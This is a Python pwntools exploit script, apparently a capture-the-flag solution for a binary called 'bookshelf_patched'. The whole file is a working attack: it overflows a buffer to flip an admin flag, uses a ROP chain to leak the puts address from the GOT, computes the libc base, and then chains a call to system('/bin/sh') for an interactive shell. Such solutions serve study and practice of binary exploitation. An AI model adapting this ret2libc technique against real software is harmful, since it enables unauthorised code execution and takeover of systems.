#!/usr/bin/env python3

from pwn import *

elf = ELF("./bookshelf_patched")
libc = ELF("./libc.so.6")
context.binary = elf

gdb_cmds = ["b * 0x0000000000401634"]
r = ["addr",1337]

def conf():
	if args.REMOTE:
		p = remote(r[0],r[1])
	else:
		p = process([elf.path])
		if args.GDB:
			gdb.attach(p,gdbscript='\n'.join(gdb_cmds))
	return p

p = conf()

def send(data):
	p.clean()
	p.sendline(data)

def main():

	# 6 byte overflow via string functions if audiobook is chosen
	# overflow admin flag in main (book is on main's stackframe)
	send("1")
	send("y")
	send("A"*40)

	# leak puts
	leak = ROP(elf)
	leak.raw("A"*56)
	leak.raw(0x000000000040101c) # pop rdi; ret
	leak.raw(elf.got["puts"])
	leak.raw(elf.plt["puts"])
	leak.raw(0x000000000040101c) # pop rdi; ret
	leak.raw(0xffffffffffffffff) # a value not equal to 0
	leak.raw(elf.sym["adminBook"])

	send("3")
	p.clean()
	p.sendline(leak.chain())
	p.readuntil("Book saved!\n")
	puts_b = p.readuntil("\n")[:-1]
	puts = struct.unpack('Q',puts_b+b"\x00\x00")[0]
	log.info("puts @ "+str(hex(puts)))

	# ret2system
	libc.address = puts-libc.symbols['puts']
	log.success("libc @ "+str(hex(libc.address)))

	rop = ROP(elf)
	rop.raw("A"*56)
	rop.raw(0x000000000040101a) # empty ret
	rop.raw(0x000000000040101c) # pop rdi; ret
	rop.raw(next(libc.search(b'/bin/sh')))
	rop.raw(libc.symbols['system'])
	send(rop.chain())

	p.interactive()


if __name__ == "__main__":
	main()
